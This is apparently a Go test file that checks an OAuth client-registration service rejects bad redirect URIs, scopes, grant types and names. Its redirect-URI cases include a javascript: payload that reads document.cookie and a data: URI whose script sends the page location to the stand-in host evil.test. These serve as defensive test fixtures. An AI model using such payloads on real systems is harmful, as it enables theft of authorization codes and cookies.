package adminclient

import (
	"context"
	"strings"
	"testing"
)

// Redirect URI validation is the first of the two open-redirect defenses.
// /oauth/authorize matches the incoming redirect_uri against the registered list by
// exact string equality, so anything accepted here is somewhere an authorization
// code can legitimately be delivered. A javascript: or data: registration would
// turn that exact match into a code-exfiltration primitive.
func TestCreateClientRejectsDangerousRedirectURIs(t *testing.T) {
	cases := []struct {
		name string
		uri  string
	}{
		{"javascript scheme", "javascript:alert(document.cookie)"},
		{"uppercase javascript scheme", "JavaScript:alert(1)"},
		{"data scheme", "data:text/html,<script>fetch('//evil.test?c='+location)</script>"},
		{"plain http on a public host", "http://app.test/callback"},
		{"custom scheme", "myapp://callback"},
		{"relative path", "/callback"},
		{"scheme relative", "//evil.test/callback"},
		{"no host", "https:///callback"},
		{"fragment", "https://app.test/callback#token"},
		{"userinfo", "https://user:pass@app.test/callback"},
		{"leading whitespace", " https://app.test/callback"},
		{"trailing whitespace", "https://app.test/callback "},
		{"embedded newline", "https://app.test/callback\n"},
		{"empty", ""},
	}
	for _, test := range cases {
		t.Run(test.name, func(t *testing.T) {
			h := newHarness(t)
			input := validCreateInput()
			input.RedirectURIs = []string{test.uri}

			_, err := h.service.CreateClient(context.Background(), input)
			assertKind(t, err, KindInvalidInput)
			if h.clients.created != nil {
				t.Fatalf("client was created with redirect_uri %q", test.uri)
			}
		})
	}
}

// http is allowed only on loopback, which is what lets a developer run the client
// locally. There is no network segment to intercept on loopback.
func TestCreateClientAllowsLoopbackHTTP(t *testing.T) {
	for _, uri := range []string{
		"http://localhost:3000/oauth/callback",
		"http://127.0.0.1:8080/cb",
		"http://[::1]:8080/cb",
		"https://app.test/callback",
	} {
		t.Run(uri, func(t *testing.T) {
			h := newHarness(t)
			input := validCreateInput()
			input.RedirectURIs = []string{uri}

			if _, err := h.service.CreateClient(context.Background(), input); err != nil {
				t.Fatalf("CreateClient(%q) error = %v, want success", uri, err)
			}
		})
	}
}

// A registration must not hold a scope set /oauth/authorize would reject, so the
// same normalizer gates both.
func TestCreateClientRejectsInvalidScopes(t *testing.T) {
	cases := []struct {
		name   string
		scopes []string
	}{
		{"missing openid", []string{"profile"}},
		{"unsupported scope", []string{"openid", "admin:all"}},
		{"duplicate", []string{"openid", "openid"}},
		{"embedded whitespace", []string{"openid profile"}},
		{"padded", []string{"openid", " profile"}},
		{"wrong case", []string{"openid", "Profile"}},
		{"empty list", nil},
	}
	for _, test := range cases {
		t.Run(test.name, func(t *testing.T) {
			h := newHarness(t)
			input := validCreateInput()
			input.Scopes = test.scopes

			_, err := h.service.CreateClient(context.Background(), input)
			assertKind(t, err, KindInvalidInput)
		})
	}
}

// Registering a grant the token endpoint does not implement would advertise a
// capability that fails at redemption.
func TestCreateClientRejectsInvalidGrantTypes(t *testing.T) {
	cases := []struct {
		name   string
		grants []string
	}{
		{"unsupported grant", []string{"authorization_code", "client_credentials"}},
		{"password grant", []string{"password"}},
		{"implicit", []string{"token"}},
		{"missing authorization_code", []string{"refresh_token"}},
		{"duplicate", []string{"authorization_code", "authorization_code"}},
		{"empty", nil},
	}
	for _, test := range cases {
		t.Run(test.name, func(t *testing.T) {
			h := newHarness(t)
			input := validCreateInput()
			input.GrantTypes = test.grants

			_, err := h.service.CreateClient(context.Background(), input)
			assertKind(t, err, KindInvalidInput)
		})
	}
}

func TestCreateClientRejectsInvalidNameAndType(t *testing.T) {
	t.Run("empty name", func(t *testing.T) {
		h := newHarness(t)
		input := validCreateInput()
		input.ClientName = "   "
		_, err := h.service.CreateClient(context.Background(), input)
		assertKind(t, err, KindInvalidInput)
	})
	t.Run("overlong name", func(t *testing.T) {
		h := newHarness(t)
		input := validCreateInput()
		input.ClientName = strings.Repeat("a", 101)
		_, err := h.service.CreateClient(context.Background(), input)
		assertKind(t, err, KindInvalidInput)
	})
	// A 100-rune CJK name is within the limit: the bound is runes, not bytes.
	t.Run("cjk name within limit", func(t *testing.T) {
		h := newHarness(t)
		input := validCreateInput()
		input.ClientName = strings.Repeat("应", 100)
		if _, err := h.service.CreateClient(context.Background(), input); err != nil {
			t.Fatalf("CreateClient(100 CJK runes) error = %v, want success", err)
		}
	})
	t.Run("control characters", func(t *testing.T) {
		h := newHarness(t)
		input := validCreateInput()
		input.ClientName = "App\x00Name"
		_, err := h.service.CreateClient(context.Background(), input)
		assertKind(t, err, KindInvalidInput)
	})
	t.Run("unknown client type", func(t *testing.T) {
		h := newHarness(t)
		input := validCreateInput()
		input.ClientType = "internal"
		_, err := h.service.CreateClient(context.Background(), input)
		assertKind(t, err, KindInvalidInput)
	})
}

func TestCreateClientRejectsTooManyAndDuplicateRedirectURIs(t *testing.T) {
	t.Run("duplicates", func(t *testing.T) {
		h := newHarness(t)
		input := validCreateInput()
		input.RedirectURIs = []string{"https://app.test/cb", "https://app.test/cb"}
		_, err := h.service.CreateClient(context.Background(), input)
		assertKind(t, err, KindInvalidInput)
	})
	t.Run("too many", func(t *testing.T) {
		h := newHarness(t)
		input := validCreateInput()
		uris := make([]string, 0, 11)
		for i := 0; i < 11; i++ {
			uris = append(uris, "https://app.test/cb"+string(rune('a'+i)))
		}
		input.RedirectURIs = uris
		_, err := h.service.CreateClient(context.Background(), input)
		assertKind(t, err, KindInvalidInput)
	})
}
